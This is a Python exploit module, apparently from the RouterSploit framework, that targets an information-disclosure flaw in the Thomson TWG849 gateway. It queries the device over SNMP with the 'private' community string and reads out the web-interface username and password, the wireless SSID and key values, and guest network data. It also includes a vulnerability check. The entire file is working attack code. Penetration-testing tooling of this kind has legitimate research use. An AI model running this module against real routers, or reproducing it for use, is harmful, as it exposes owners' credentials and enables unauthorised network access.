from pysnmp.entity.rfc3413.oneliner import cmdgen
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_table,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Thomson TWG849 information disclosure vulnerability.
    If the target is vulnerable, it allows read sensitive information.
    """
    __info__ = {
        'name': 'Thomson TWG849 Info Disclosure',
        'description': 'Module exploits Thomson TWG849 information disclosure vulnerability which allows to read sensitive information.',
        'authors': [
            'Sebastian Perez',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://packetstormsecurity.com/files/133631/Thomson-CableHome-Gateway-DWG849-Information-Disclosure.html',
        ],
        'devices': [
            'Thomson TWG849',
        ]
    }

    target = exploits.Option('', 'Target IP address e.g. 192.168.1.1', validators=validators.address)

    oids = {  # make, model, software version
        "model": "1.3.6.1.2.1.1.1.0",
        "uptime": "1.3.6.1.2.1.1.3.0",
        # web interface credentials
        "username": "1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0",
        "password": "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0",
        # ssid and key
        "ssid1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32",
        "ssid2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32",
        # guest network oids
        "guest1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.33",
        "guest2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.34",
        "guest3": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.35",
    }

    def run(self):
        res = []

        cmdGen = cmdgen.CommandGenerator()
        print_status("Reading parameters...")
        for name in self.oids.keys():
            errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
                cmdgen.CommunityData("private"),
                cmdgen.UdpTransportTarget((self.target, 161)),
                self.oids[name],
            )

            if errorIndication or errorStatus:
                continue

            value = str(varBinds[0][1])
            res.append((name, value))

        if res:
            print_success("Exploit success")
            print_table(("Parameter", "Value"), *res)
        else:
            print_error("Exploit failed - could not read sensitive information")

    @mute
    def check(self):
        cmdGen = cmdgen.CommandGenerator()
        errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
            cmdgen.CommunityData("private"),
            cmdgen.UdpTransportTarget((self.target, 161)),
            '1.3.6.1.2.1.1.1.0',
        )

        if errorIndication or errorStatus:
            return False  # target is not vulnerable
        else:
            return True  # target is vulnerable
